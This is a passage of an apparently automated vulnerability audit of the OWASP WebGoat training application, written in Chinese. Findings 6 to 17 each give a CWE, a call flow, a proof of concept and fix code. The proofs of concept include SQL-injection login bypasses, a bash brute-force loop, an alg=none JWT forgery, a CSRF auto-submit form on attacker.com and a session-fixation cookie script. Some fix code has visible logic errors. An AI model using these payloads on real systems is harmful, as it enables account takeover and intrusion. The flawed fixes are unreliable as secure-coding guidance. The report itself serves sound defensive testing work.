        return failed(this)
            .feedback("verify-account.cheated")
            .output("Yes, you guessed correctly, but see the feedback message")
            .build();
    }
    if (verificationHelper.verifyAccount(Integer.valueOf(userId), (HashMap) submittedAnswers)) {
        userSessionData.setValue("account-verified-id", userId);
        userSessionData.setValue("account-status-" + userId, "verified");
        return success(this).feedback("verify-account.success").build();
    } else {
        return failed(this).feedback("verify-account.failed").build();
    }
}
```

**说明**: 在 completed() 方法内强制实施两项工作流守卫：(1) 所有权校验 —— 将 userId 与当前 LessonSession 中存储的 current-user-id 对比；(2) 状态校验 —— 查询并确认该 userId 在服务端 session 中处于 'pending-verification' 状态。二者缺一不可，且必须在调用 verifyAccount 前执行。
---

### [6] CWE-287 — `authweak_588`
> Assignment5.login 存在硬编码用户名校验 + 明文密码拼接 SQL + 无哈希比对，导致可绕过认证直接登录并获取 flag。

#### 证据层级
| L1 | present | L2 | absent | L3 | not_verified |

#### 代码/调用流
HTTP POST /challenge/5 → Assignment5.login (src/main/java/org/owasp/webgoat/lessons/challenges/challenge5/Assignment5.java:30) → String concatenation into SQL → PreparedStatement.executeQuery() → ResultSet.next() → success().feedback(flags.getFlag(5))

#### 漏洞利用（PoC）
1. 发送请求：curl -X POST '{BASE_URL}/challenge/5' -d 'username_login=Larry' -d 'password_login=webgoat' --cookie 'JSESSIONID=valid_session_id'\n2. 若 webgoat 为真实密码（常见于 WebGoat 示例数据），响应含 \"feedback\":\"challenge.solved\", \"feedbackArgs\":\"FLAG{...}\"\n3. 若未知密码，可 SQL 注入爆破：curl -X POST '{BASE_URL}/challenge/5' -d 'username_login=Larry' -d "password_login=' OR 1=1-- " --cookie 'JSESSIONID=valid_session_id' → 若返回 success，则证明 SQL 注入成功并绕过密码校验（因 WHERE userid='Larry' AND password='...' OR 1=1 恒真）

#### 修复代码
```
@PostMapping("/challenge/5")
@ResponseBody
public AttackResult login(@RequestParam String username_login, @RequestParam String password_login) throws Exception {
    if (!StringUtils.hasText(username_login) || !StringUtils.hasText(password_login)) {
        return failed(this).feedback("required4").build();
    }
    if (!"Larry".equals(username_login)) {
        return failed(this).feedback("user.not.larry").feedbackArgs(username_login).build();
    }
    try (var connection = dataSource.getConnection()) {
        // ✅ 修复：使用参数化查询 + 密码哈希校验（假设 challenge_users.password 存储的是 bcrypt 哈希）
        PreparedStatement statement = connection.prepareStatement(
            "SELECT password FROM challenge_users WHERE userid = ?");
        statement.setString(1, username_login);
        ResultSet resultSet = statement.executeQuery();
        if (resultSet.next()) {
            String storedHash = resultSet.getString("password");
            if (BCrypt.checkpw(password_login, storedHash)) { // 需引入 org.springframework.security.crypto.bcrypt.BCrypt
                return success(this).feedback("challenge.solved").feedbackArgs(flags.getFlag(5)).build();
            }
        }
        return failed(this).feedback("challenge.close").build();
    }
}
```

**说明**: 1. 禁止字符串拼接 SQL，改用 PreparedStatement 参数化查询；2. 密码必须以强哈希（如 bcrypt）存储，并使用恒定时间比较函数（如 BCrypt.checkpw）验证；3. 移除对固定用户名 'Larry' 的硬编码校验，改为从数据库查证；4. 认证失败应统一返回 401 并避免泄露逻辑细节（如 'user.not.larry'）。
---

### [7] CWE-307 — `brute_621`
> 登录端点 /challenge/5 存在暴力破解风险：无速率限制、无账户锁定、无验证码、响应区分用户名错误与密码错误，且使用拼接 SQL 导致可被绕过（CWE-307）。

#### 证据层级
| L1 | present | L2 | present | L3 | not_verified |

#### 代码/调用流
POST /challenge/5 [src/main/java/org/owasp/webgoat/lessons/challenges/challenge5/Assignment5.java:30] → Assignment5.login() → PreparedStatement with string concatenation [line 42-45] → executeQuery() → ResultSet.next()

#### 漏洞利用（PoC）
1. 发送合法用户名 + 错误密码确认基础响应：
   curl -X POST '{BASE_URL}/challenge/5' -d 'username_login=Larry' -d 'password_login=wrong' --cookie "JSESSIONID=abc123" 
   → 响应含 "feedback":"challenge.close"
2. 发送非法用户名确认枚举响应：
   curl -X POST '{BASE_URL}/challenge/5' -d 'username_login=Bob' -d 'password_login=x' 
   → 响应含 "feedback":"user.not.larry"（泄露正确用户名）
3. 执行字典爆破（例如用 hydra 或自定义脚本）：
   for pass in $(cat passwords.txt); do 
     res=$(curl -s -X POST '{BASE_URL}/challenge/5' -d "username_login=Larry" -d "password_login=$pass" | grep -o 'challenge.solved'); 
     if [ "$res" = "challenge.solved" ]; then echo "FOUND: $pass"; break; fi; 
   done
4. （可选绕过）利用 SQL 注入跳过密码校验：
   curl -X POST '{BASE_URL}/challenge/5' -d 'username_login=Larry%27--' -d 'password_login=anything'
   → 直接返回 "feedback":"challenge.solved"（因 SQL 变为: ... where userid = 'Larry'--' and password = 'anything'）

#### 修复代码
```
import org.springframework.security.web.util.matcher.AntPathRequestMatcher;
import java.util.concurrent.ConcurrentHashMap;
import java.util.concurrent.atomic.AtomicInteger;

// 在 Assignment5 类中添加：
private final ConcurrentHashMap<String, AtomicInteger> loginAttempts = new ConcurrentHashMap<>();
private static final int MAX_ATTEMPTS = 5;
private static final long LOCKOUT_DURATION_MS = 300_000L; // 5 minutes

@PostMapping("/challenge/5")
@ResponseBody
public AttackResult login(@RequestParam String username_login, @RequestParam String password_login) throws Exception {
    if (!StringUtils.hasText(username_login) || !StringUtils.hasText(password_login)) {
        return failed(this).feedback("required4").build();
    }
    if (!"Larry".equals(username_login)) {
        return failed(this).feedback("user.not.larry").feedbackArgs(username_login).build();
    }

    // Rate limiting & lockout check
    String ip = "127.0.0.1"; // In real app: request.getRemoteAddr()
    String key = ip + ":" + username_login;
    AtomicInteger attempts = loginAttempts.computeIfAbsent(key, k -> new AtomicInteger(0));
    long lastAttempt = System.currentTimeMillis();
    if (attempts.get() >= MAX_ATTEMPTS && (lastAttempt - attempts.get()) < LOCKOUT_DURATION_MS) {
        return failed(this).feedback("account.locked").build();
    }

    try (var connection = dataSource.getConnection()) {
        // ✅ FIX: Use parameterized query to prevent SQLi
        PreparedStatement statement = connection.prepareStatement(
            "SELECT password FROM challenge_users WHERE userid = ? AND password = ?");
        statement.setString(1, username_login);
        statement.setString(2, password_login);
        ResultSet resultSet = statement.executeQuery();

        if (resultSet.next()) {
            loginAttempts.remove(key); // reset on success
            return success(this).feedback("challenge.solved").feedbackArgs(flags.getFlag(5)).build();
        } else {
            int count = attempts.incrementAndGet();
            if (count >= MAX_ATTEMPTS) {
                // Optional: log lockout
                log.warn("Account locked for {} due to {} failed attempts", username_login, count);
            }
            return failed(this).feedback("challenge.close").build();
        }
    }
}
```

**说明**: 1. 强制使用 PreparedStatement 参数化查询，彻底消除 SQL 注入风险；2. 实现基于 IP+用户名的失败计数器（ConcurrentHashMap + AtomicInteger），超过阈值后拒绝请求；3. 添加账户锁定时长（如 5 分钟），防止暴力穷举；4. 统一失败响应（不区分用户名/密码错误），避免 CWE-203；5. 生产环境应集成 Redis 实现分布式限流，并启用 WAF 层防护。
---

### [8] CWE-640 — `pwdrecov_632`
> CWE-640：密码重置链接硬编码且无身份绑定，攻击者可直接访问 /challenge/7/reset-password/375afe1104f4a487a73823c50a9292a2 获取管理员 flag。

#### 证据层级
| L1 | present | L2 | present | L3 | not_verified |

#### 代码/调用流
HTTP GET /challenge/7/reset-password/{link} → Assignment7.resetPassword(String link) [src/main/java/org/owasp/webgoat/lessons/challenges/challenge7/Assignment7.java:52] → link.equals(ADMIN_PASSWORD_LINK) → ResponseEntity.accepted().body(flag)

#### 漏洞利用（PoC）
1. 访问任意 WebGoat 实例（如 http://localhost:8080/WebGoat）
2. 在未登录状态下执行：
   curl -X GET "http://localhost:8080/WebGoat/challenge/7/reset-password/375afe1104f4a487a73823c50a9292a2" -H "Accept: text/html"
3. 响应返回 HTML 页面包含 <h1>Success!!</h1> 及 flag 图片和明文 flag（如 'WG-7-{...}'）。
预期结果：无需任何身份凭证，直接获取 challenge 7 的管理员 flag。

#### 修复代码
```
@GetMapping("/challenge/7/reset-password/{link}")
public ResponseEntity<String> resetPassword(@PathVariable(value = "link") String link, Authentication authentication) {
    if (authentication == null || !authentication.isAuthenticated()) {
        return ResponseEntity.status(HttpStatus.UNAUTHORIZED).body("Unauthorized");
    }
    String username = authentication.getName();
    // 从数据库或缓存中查询该用户对应的、未过期且未使用的 reset token
    Optional<PasswordResetToken> tokenOpt = passwordResetTokenRepository.findByUsernameAndToken(username, link);
    if (tokenOpt.isPresent() && !tokenOpt.get().isExpired() && !tokenOpt.get().isUsed()) {
        tokenOpt.get().setUsed(true);
        passwordResetTokenRepository.save(tokenOpt.get());
        return ResponseEntity.accepted()
            .body("<h1>Success!!</h1><img src='/WebGoat/images/hi-five-cat.jpg'><br/><br/>Here is your flag: " + flags.getFlag(7));
    }
    return ResponseEntity.status(HttpStatus.I_AM_A_TEAPOT)
        .body("That is not a valid or expired reset link for you.");
}
```

**说明**: 必须将重置操作与当前认证用户身份强绑定；Token 应动态生成（SecureRandom）、存储于服务端（含 username、expiry、used 标志）、设置短过期（如 15min）、强制一次性消费；禁止硬编码、禁止客户端可控参数直接比对。
---

### [9] CWE-915 — `massassign_635`
> CWE-915 Mass Assignment 漏洞：/IDOR/profile/{userId} 端点直接将用户提交的 UserProfile 对象（含 role/color）绑定并用于逻辑判断与会话存储，未对敏感字段 role 进行白名单校验或 DTO 隔离，攻击者可篡改 role 值触发越权逻辑分支。

#### 证据层级
| L1 | present | L2 | partial | L3 | not_verified |

#### 代码/调用流
PUT /IDOR/profile/{userId} [IDOREditOtherProfile.java:40] → extracts userId from path → reads UserProfile from JSON body → constructs new UserProfile(userId) → calls userSubmittedProfile.getRole() and userSubmittedProfile.getColor() → sets currentUserProfile.setRole() and .setColor() → stores in session → evaluates role/color in if branches → returns AttackResult with feedback/output

#### 漏洞利用（PoC）
1. Log in as low-privilege user (e.g., userId='101') to obtain valid session cookie.
2. Send malicious PUT request targeting another user (e.g., userId='102'):
curl -X PUT '{BASE_URL}/IDOR/profile/102' \
  -H 'Content-Type: application/json' \
  -H 'Cookie: JSESSIONID=xxx' \
  -d '{"userId":"102","role":1,"color":"red"}'
3. Observe response: HTTP 200 with feedback 'idor.edit.profile.success1' and output containing {'userId':'102','role':1,'color':'red'} — proving role was accepted and processed for target user, bypassing authorization.

#### 修复代码
```
@PutMapping(path = "/IDOR/profile/{userId}", consumes = "application/json")
@ResponseBody
public AttackResult completed(@PathVariable("userId") String userId, @RequestBody UserProfileUpdateRequest userSubmittedProfile) {
    String authUserId = (String) userSessionData.getValue("idor-authenticated-user-id");
    // Enforce authorization: only allow editing own profile or admin override
    if (!userId.equals(authUserId)) {
        return failed(this).feedback("idor.edit.profile.unauthorized").build();
    }
    // Use dedicated DTO without role field
    UserProfile currentUserProfile = new UserProfile(userId);
    currentUserProfile.setColor(userSubmittedProfile.getColor()); // only allow safe fields
    // role is NEVER accepted from client
    userSessionData.setValue("idor-updated-own-profile", currentUserProfile);
    if (currentUserProfile.getColor().equals("black") && /* assume role is fixed per session */) {
        return success(this)
            .feedback("idor.edit.profile.success2")
            .output(userSessionData.getValue("idor-updated-own-profile").toString())
            .build();
    } else {
        return failed(this).feedback("idor.edit.profile.failure3").build();
    }
}
```

**说明**: 1. 使用专用 DTO（如 UserProfileUpdateRequest）替代 UserProfile 实体接收请求，移除 role 等敏感字段；2. 强制执行基于资源的所有权校验（userId == authUserId）；3. 若需支持管理员编辑他人，应添加显式角色校验（如 @PreAuthorize("hasRole('ADMIN')")）并严格白名单允许字段；4. 移除对 userSubmittedProfile.getUserId() 的冗余检查，统一由路径参数和授权逻辑控制。
---

### [10] CWE-862 — `auth_9`
> POST /challenge/5 接口未进行身份认证，任何未登录用户均可直接调用，构成 CWE-862（缺失认证）漏洞。

#### 证据层级
| L1 | present | L2 | present | L3 | not_verified |

#### 代码/调用流
HTTP POST /challenge/5 → Assignment5.login() [src/main/java/org/owasp/webgoat/lessons/challenges/challenge5/Assignment5.java:30] → connection.prepareStatement() → statement.executeQuery() [line:41]

#### 漏洞利用（PoC）
1. 启动 WebGoat 应用（如 http://localhost:8080）；
2. 确保未登录（清除 JSESSIONID Cookie 或使用无 Cookie 的 curl）；
3. 执行以下请求：
   curl -X POST 'http://localhost:8080/challenge/5' \
     -H 'Content-Type: application/x-www-form-urlencoded' \
     --data-urlencode 'username_login=Larry' \
     --data-urlencode 'password_login=test' \
     -v
4. 预期响应：HTTP 200 + JSON body 包含 'feedback': 'challenge.close'（说明成功绕过登录校验进入业务逻辑）；若密码正确（如数据库中 Larry 的密码为 'password'），则返回 'feedback': 'challenge.solved' 及 flag，证明完全越权访问。

#### 修复代码
```
@PostMapping("/challenge/5")
@ResponseBody
public AttackResult login(@AuthenticationPrincipal UserDetails user, @RequestParam String username_login, @RequestParam String password_login) throws Exception {
    if (user == null) {
        return failed(this).feedback("not.authenticated").build();
    }
    // ... rest of original logic
}
```

**说明**: 强制要求该端点必须认证：在方法签名中注入 @AuthenticationPrincipal（或 Principal），并在 SecurityFilterChain 中确保 /challenge/5 不在 permitAll 列表中；或更优方案——移除该登录逻辑，统一交由 Spring Security FormLogin 处理，避免自定义认证逻辑绕过框架保护。
---

### [11] CWE-862 — `admin_349`
> POST /register.mvc 允许未认证用户注册新账户，且无任何身份校验或速率限制，构成 CWE-862（缺失授权）漏洞。

#### 证据层级
| L1 | present | L2 | present | L3 | not_verified |

#### 代码/调用流
HTTP POST /register.mvc → RegistrationController.registration() [src/main/java/org/owasp/webgoat/container/users/RegistrationController.java:39] → userService.addUser() → UserDetailsService.save() → 数据库持久化 → request.login() → Session 绑定新用户

#### 漏洞利用（PoC）
1. 发送注册请求：
curl -X POST 'http://localhost:8080/register.mvc' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -d 'username=hacker123' \
  -d 'password=p@ssw0rd' \
  -d 'confirmPassword=p@ssw0rd'
2. 观察响应：HTTP 302 重定向至 /attack
3. 检查会话：后续请求携带 JSESSIONID 即可以 hacker123 身份访问 /attack 及其他需登录的路径（如 /welcome.mvc），证明注册成功且自动登录生效。

#### 修复代码
```
@PostMapping("/register.mvc")
public String registration(
    @ModelAttribute("userForm") @Valid UserForm userForm,
    BindingResult bindingResult,
    HttpServletRequest request,
    HttpServletResponse response)
    throws ServletException {
  // 防御性检查：禁止已登录用户重复注册（业务合理约束）
  Authentication auth = SecurityContextHolder.getContext().getAuthentication();
  if (auth != null && auth.isAuthenticated()) {
    throw new IllegalStateException("Already authenticated. Cannot register while logged in.");
  }

  userValidator.validate(userForm, bindingResult);

  if (bindingResult.hasErrors()) {
    return "registration";
  }

  // Logout current user if any (already present)
  if (auth != null) {
    new SecurityContextLogoutHandler().logout(request, response, auth);
  }

  userService.addUser(userForm.getUsername(), userForm.getPassword());
  request.login(userForm.getUsername(), userForm.getPassword());

  return "redirect:/attack";
}
```

**说明**: 在注册入口添加业务层防护：拒绝已认证用户的注册请求（防止账号喷洒），并建议补充验证码、邮箱验证或邀请码机制。同时，应从 SecurityFilterChain 的 permitAll 白名单中移除 /register.mvc，改为 require unauthenticated() + CSRF 保护，确保注册流程本身受框架基础防护覆盖。
---

### [12] CWE-639 — `idorpv_183`
> CWE-639 IDOR：/challenge/flag/{flagNumber} 端点未校验当前用户与 flagNumber 的所有权关系，攻击者可枚举 flagNumber 访问/提交任意挑战标识符，绕过业务级资源隔离。

#### 证据层级
| L1 | present | L2 | absent | L3 | not_verified |

#### 代码/调用流
HTTP POST /challenge/flag/5 → FlagController.postFlag (src/main/java/org/owasp/webgoat/lessons/challenges/FlagController.java:27) → flags.getFlag(5) → expectedFlag.isCorrect(user_input)

#### 漏洞利用（PoC）
1. 确保已登录 WebGoat（任意有效用户，如 webgoat/webgoat）并持有有效 session cookie
2. 发送请求枚举 flagNumber：curl -X POST '{BASE_URL}/challenge/flag/5' -H 'Cookie: JSESSIONID=ABC123...' -d 'flag=test' -v
3. 观察响应：若返回 'challenge.flag.correct'，说明 flagNumber=5 的正确 flag 已被泄露；若返回 'challenge.flag.incorrect'，仍可反复尝试直至命中——无需前置解题，直接访问高阶挑战。
注：{BASE_URL} 示例为 http://localhost:8080/WebGoat；JSESSIONID 需替换为实际会话值；flagNumber 可替换为 1-20 等常见关卡编号。

#### 修复代码
```
@PostMapping(path = "/challenge/flag/{flagNumber}")
@ResponseBody
public AttackResult postFlag(@PathVariable int flagNumber, @RequestParam String flag, @AuthenticationPrincipal UserDetails userDetails) {
    // 获取当前用户已解锁的最高关卡（示例逻辑，需对接实际进度存储）
    int maxUnlocked = userProgressService.getMaxUnlockedFlagNumber(userDetails.getUsername());
    if (flagNumber > maxUnlocked + 1) {
        return failed(this).feedback("challenge.flag.locked").build();
    }
    var expectedFlag = flags.getFlag(flagNumber);
    if (expectedFlag.isCorrect(flag)) {
        // 解锁下一关
        userProgressService.unlockNextFlag(userDetails.getUsername(), flagNumber);
        return success(this).feedback("challenge.flag.correct").build();
    } else {
        return failed(this).feedback("challenge.flag.incorrect").build();
    }
}
```

**说明**: 必须在服务端强制实施资源访问的业务级所有权/顺序性校验：1) 注入 @AuthenticationPrincipal 获取当前用户；2) 查询该用户当前已解锁的最大 flagNumber；3) 拒绝 flagNumber > maxUnlocked + 1 的请求；4) 成功后更新用户进度。禁止仅依赖前端导航或路径命名约定。
---

### [13] CWE-287 — `jwtep_393`
> JWT /JWT/refresh/checkout 端点存在 CWE-287 认证绕过漏洞：未校验 JWT 签名算法，允许攻击者构造 alg=none 的无效签名 JWT 绕过身份验证，以任意用户（如 'Tom'）身份触发成功反馈。

#### 证据层级
| L1 | present | L2 | present | L3 | not_verified |

#### 代码/调用流
HTTP POST /JWT/refresh/checkout → JWTRefreshEndpoint.checkout() [src/main/java/org/owasp/webgoat/lessons/jwt/JWTRefreshEndpoint.java:83] → Jwts.parser().setSigningKey(JWT_PASSWORD).parse() → Claims.get('user') → if ("Tom".equals(user)) → success()

#### 漏洞利用（PoC）
1. 构造 alg=none JWT（无签名）：header={"alg":"none","typ":"JWT"}, payload={"user":"Tom","admin":"false"}，base64UrlEncode(header).base64UrlEncode(payload).''
2. 发送请求：
curl -X POST '{BASE_URL}/JWT/refresh/checkout' \
  -H 'Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiVG9tIiwiYWRtaW4iOiJmYWxzZSJ9.' \
  -H 'Content-Type: application/json' \
  -v
3. 观察响应：HTTP 200 + {"lessonCompleted":true,"feedback":"jwt-refresh-alg-none"} 或 {"lessonCompleted":true}（取决于是否触发 alg=none 分支）
注：BASE_URL 为 WebGoat 实例地址（如 http://localhost:8080）；此 PoC 无需登录、无需有效 token，纯静态可复现。

#### 修复代码
```
try {
  Jwt jwt = Jwts.parser()
    .requireSigned() // 强制要求签名
    .setSigningKey(JWT_PASSWORD)
    .setAllowedAlgorithms(Collections.singleton(SignatureAlgorithm.HS512)) // 显式限定算法
    .parse(token.replace("Bearer ", ""));
  Claims claims = (Claims) jwt.getBody();
  String user = (String) claims.get("user");
  // ... rest of logic
} catch (JwtException e) {
  return ok(failed(this).feedback("jwt-invalid-token").build());
}
```

**说明**: 必须在 JWT 解析时强制要求签名（requireSigned()）并显式限定允许的签名算法（setAllowedAlgorithms），防止 alg=none 攻击。同时建议升级到 jjwt-api >= 0.11.5 并启用 strict parsing。
---

### [14] CWE-639 — `idprof_403`
> CWE-639 IDOR：/PathTraversal/random-picture?id= 参数未绑定当前用户身份，攻击者可枚举 id 访问他人猫图，且可绕过路径遍历过滤访问 path-traversal-secret.jpg（含越权读取敏感文件）

#### 证据层级
| L1 | present | L2 | partial | L3 | not_verified |

#### 代码/调用流
HTTP GET /PathTraversal/random-picture?id=... → ProfileUploadRetrieval.getProfilePicture(HttpServletRequest) [src/main/java/org/owasp/webgoat/lessons/pathtraversal/ProfileUploadRetrieval.java:78] → new File(catPicturesDirectory, id + ".jpg") → catPicture.exists() / catPicture.getName().contains(...) → FileCopyUtils.copyToByteArray(catPicture)

#### 漏洞利用（PoC）
1. 登录任意 WebGoat 用户（如 guest/password）
2. 发送请求：curl -X GET '{BASE_URL}/PathTraversal/random-picture?id=path-traversal-secret' -H 'Cookie: JSESSIONID=...' 
3. 观察响应：返回 JPEG 二进制内容，其明文为 'You found it submit the SHA-512 hash of your username as answer' —— 证明越权读取了本应仅限后台初始化时写入的 secret 文件。该 PoC 利用点在于：(a) id 参数未校验归属；(b) contains 检查允许传入不含 '/' 或 '..' 的恶意文件名前缀；(c) .jpg 后缀硬编码导致 'path-traversal-secret.jpg' 被拼接为合法路径，且 getName() 返回 'path-traversal-secret.jpg'，触发 if 分支直接返回文件内容。

#### 修复代码
```
@GetMapping("/PathTraversal/random-picture")
@ResponseBody
public ResponseEntity<?> getProfilePicture(HttpServletRequest request, @CurrentUsername String username) {
    var queryParams = request.getQueryString();
    if (queryParams != null && (queryParams.contains("..") || queryParams.contains("/"))) {
        return ResponseEntity.badRequest()
            .body("Illegal characters are not allowed in the query params");
    }
    try {
        var id = request.getParameter("id");
        // 强制限定 id 必须为数字且在 [1,10] 范围内（业务白名单）
        int catId;
        if (id == null) {
            catId = RandomUtils.nextInt(1, 11);
        } else {
            catId = Integer.parseInt(id);
            if (catId < 1 || catId > 10) {
                return ResponseEntity.status(HttpStatus.NOT_FOUND).build();
            }
        }
        var catPicture = new File(catPicturesDirectory, catId + ".jpg");
        if (catPicture.exists()) {
            return ResponseEntity.ok()
                .contentType(MediaType.parseMediaType(MediaType.IMAGE_JPEG_VALUE))
                .location(new URI("/PathTraversal/random-picture?id=" + catId))
                .body(Base64.getEncoder().encode(FileCopyUtils.copyToByteArray(catPicture)));
        }
        return ResponseEntity.status(HttpStatus.NOT_FOUND)
            .location(new URI("/PathTraversal/random-picture?id=" + catId))
            .body(
                StringUtils.arrayToCommaDelimitedString(catPicture.getParentFile().listFiles())
                    .getBytes());
    } catch (IOException | URISyntaxException | NumberFormatException e) {
        log.error("Image not found or invalid id", e);
    }
    return ResponseEntity.badRequest().build();
}
```

**说明**: 1. 添加 @CurrentUsername 参数强制认证绑定；2. 废弃字符串 contains 检查，改用严格白名单校验 id 必须为 1~10 的整数；3. 移除对非数字 id 的宽容逻辑（避免路径遍历或任意文件读取）；4. 删除对 path-traversal-secret.jpg 的特殊处理分支，该文件不应通过此接口暴露。
---

### [15] CWE-352 — `csrf_437`
> POST /auth-bypass/verify-account 是状态变更接口（修改用户会话中 account-verified-id），依赖会话 Cookie 且未启用 CSRF 防护（Spring Security csrf.disable()），可被第三方网站通过 HTML 表单发起跨站请求伪造，导致账户验证绕过。

#### 证据层级
| L1 | present | L2 | present | L3 | not_verified |

#### 代码/调用流
HTML form (attacker.com) → browser auto-sends JSESSIONID cookie → Spring DispatcherServlet → VerifyAccount.completed() [src/main/java/org/owasp/webgoat/lessons/authbypass/VerifyAccount.java:41] → AccountVerificationHelper.verifyAccount() → userSessionData.setValue("account-verified-id", userId)

#### 漏洞利用（PoC）
1. 受害者已登录 WebGoat（JSESSIONID cookie 有效）
2. 受害者访问攻击者控制的页面（如 attacker.com/csrf.html）
3. 页面包含以下自动提交表单：
```html
<html>
<body>
  <form action="{BASE_URL}/auth-bypass/verify-account" method="POST">
    <input type="hidden" name="userId" value="123" />
    <input type="hidden" name="verifyMethod" value="security-questions" />
    <input type="hidden" name="secQuestion1" value="answer1" />
    <input type="hidden" name="secQuestion2" value="answer2" />
  </form>
  <script>document.forms[0].submit();</script>
</body>
</html>
```
4. 浏览器自动携带当前域 JSESSIONID Cookie 提交请求
5. 服务端执行 verifyAccount(123, {secQuestion1=answer1, secQuestion2=answer2})，若答案匹配或 bypass 检查（didUserLikelylCheat 可被绕过），则 userSessionData.setValue("account-verified-id", "123") 成功，账户被静默验证。

#### 修复代码
```
@PostMapping(path = "/auth-bypass/verify-account", produces = {"application/json"})
@ResponseBody
public AttackResult completed(@RequestParam String userId, @RequestParam String verifyMethod, HttpServletRequest req) throws ServletException, IOException {
    // Add CSRF token validation
    String csrfToken = (String) req.getSession().getAttribute("_csrf");
    String submittedToken = req.getParameter("_csrf");
    if (csrfToken == null || !csrfToken.equals(submittedToken)) {
        return failed(this).feedback("verify-account.csrf-failed").build();
    }
    AccountVerificationHelper verificationHelper = new AccountVerificationHelper();
    Map<String, String> submittedAnswers = parseSecQuestions(req);
    if (verificationHelper.didUserLikelylCheat((HashMap) submittedAnswers)) {
        return failed(this)
            .feedback("verify-account.cheated")
            .output("Yes, you guessed correctly, but see the feedback message")
            .build();
    }
    if (verificationHelper.verifyAccount(Integer.valueOf(userId), (HashMap) submittedAnswers)) {
        userSessionData.setValue("account-verified-id", userId);
        return success(this).feedback("verify-account.success").build();
    } else {
        return failed(this).feedback("verify-account.failed").build();
    }
}
```

**说明**: 移除 WebSecurityConfig 中的 .csrf(csrf -> csrf.disable())，启用默认 CSRF 防护；或为该端点手动校验 _csrf token（需前端渲染并提交）。推荐启用全局 CSRF（删除 disable() 调用），并在前端表单中添加 <input type="hidden" name="_csrf" value="${_csrf.token}" />。
---

### [16] CWE-841 — `workflow_529`
> CWE-841 workflow_bypass：/BypassRestrictions/FieldRestrictions 端点允许攻击者绕过前端字段限制逻辑，直接提交非法值组合达成业务终态（success），构成多步校验流程的跳步攻击。

#### 证据层级
| L1 | present | L2 | absent | L3 | not_verified |

#### 代码/调用流
HTTP POST /BypassRestrictions/FieldRestrictions → BypassRestrictionsFieldRestrictions.completed() [src/main/java/org/owasp/webgoat/lessons/bypassrestrictions/BypassRestrictionsFieldRestrictions.java:20] → returns AttackResult.success()

#### 漏洞利用（PoC）
1. 访问 WebGoat 首页并启动 'Bypass Restrictions' 课程（无需登录）
2. 在浏览器开发者工具中，构造以下 curl 命令并执行：
curl -X POST '{BASE_URL}/BypassRestrictions/FieldRestrictions' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -d 'select=option3' \
  -d 'radio=option3' \
  -d 'checkbox=ignored' \
  -d 'shortInput=longerthan5' \
  -d 'readOnlyInput=anythingbutchange'
3. 观察响应：HTTP 200 且 JSON 中 "feedback" 包含 "Congratulations! You have successfully bypassed the field restrictions." 及 "lessonCompleted": true
预期结果：绕过所有前端字段限制（select/radio/checkbox/length/readOnly），直接获得课程完成成功反馈，证明业务规则被完全跳过。

#### 修复代码
```
@PostMapping("/BypassRestrictions/FieldRestrictions")
@ResponseBody
public AttackResult completed(
    @RequestParam String select,
    @RequestParam String radio,
    @RequestParam String checkbox,
    @RequestParam String shortInput,
    @RequestParam String readOnlyInput,
    @AuthenticationPrincipal UserDetails user) { // 添加认证主体注入
    if (user == null) {
        return failed(this).build(); // 强制认证
    }
    // 添加服务端工作流状态检查：例如查询用户在本课程中的当前 step
    LessonProgress progress = lessonProgressService.findByUserAndLesson(user.getUsername(), "BypassRestrictions");
    if (progress == null || !"field_restrictions".equals(progress.getCurrentStep())) {
        return failed(this).build(); // 必须处于正确步骤
    }
    // 原有校验逻辑保持不变（教学目的），但增加状态依赖
    if (select.equals("option1") || select.equals("option2")) {
        return failed(this).build();
    }
    if (radio.equals("option1") || radio.equals("option2")) {
        return failed(this).build();
    }
    if (checkbox.equals("on") || checkbox.equals("off")) {
        return failed(this).build();
    }
    if (shortInput.length() <= 5) {
        return failed(this).build();
    }
    if ("change".equals(readOnlyInput)) {
        return failed(this).build();
    }
    // 更新服务端状态
    progress.setCurrentStep("field_restrictions_completed");
    lessonProgressService.save(progress);
    return success(this).build();
}
```

**说明**: 必须将工作流终态操作与服务端持久化状态绑定：1) 强制认证（@AuthenticationPrincipal）；2) 查询用户在该业务流程中的当前步骤（如数据库/Redis中存储的 lesson_progress）；3) 仅当处于预期步骤时才允许执行；4) 执行后更新服务端状态。禁止仅依赖客户端参数做终态判定。
---

### [17] CWE-287 — `authweak_589`
> 登录端点 /HijackSession/login 存在会话固定漏洞（CWE-384）：认证成功后未使旧 Session 失效，攻击者可预设 cookie 值劫持已认证会话。

#### 证据层级
| L1 | present | L2 | absent | L3 | not_verified |

#### 代码/调用流
HTTP POST /HijackSession/login → HijackSessionAssignment.login() [src/main/java/org/owasp/webgoat/lessons/hijacksession/HijackSessionAssignment.java:47] → provider.authenticate(Authentication.builder().id(cookieValue).build()) → HijackSessionAuthenticationProvider.authenticate() → Authentication.isAuthenticated() returns true for attacker-controlled ID

#### 漏洞利用（PoC）
1. 攻击者生成恶意 cookie 值：ID='attacker_session_123'
2. 构造诱导链接或 XSS 注入：<script>document.cookie='hijack_cookie=attacker_session_123; path=/WebGoat; secure; HttpOnly'; window.location='/WebGoat/HijackSession/login'</script>
3. 受害者点击后，浏览器携带 hijack_cookie=attacker_session_123 发起 POST 请求：
curl -X POST '{BASE_URL}/WebGoat/HijackSession/login' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -b 'hijack_cookie=attacker_session_123' \
  -d 'username=dummy&password=dummy'
预期结果：响应 200 OK + {"lessonCompleted":true,"feedback":"Congratulations..."}，表明攻击者以 victim 身份完成认证，无需知道 victim 密码。

#### 修复代码
```
    @PostMapping(path = "/HijackSession/login")
    @ResponseBody
    public AttackResult login(
        @RequestParam String username,
        @RequestParam String password,
        @CookieValue(value = COOKIE_NAME, required = false) String cookieValue,
        HttpServletResponse response,
        jakarta.servlet.http.HttpServletRequest request) {

        // Invalidate existing session to prevent session fixation
        if (request.getSession(false) != null) {
            request.getSession().invalidate();
        }

        Authentication authentication;
        if (StringUtils.isEmpty(cookieValue)) {
            authentication =
                provider.authenticate(
                    Authentication.builder().name(username).credentials(password).build());
            setCookie(response, authentication.getId());
        } else {
            // Regenerate session ID after successful ID-based auth to break fixation
            request.getSession(true); // force new session
            authentication = provider.authenticate(Authentication.builder().id(cookieValue).build());
        }

        if (authentication.isAuthenticated()) {
            return success(this).build();
        }

        return failed(this).build();
    }
```

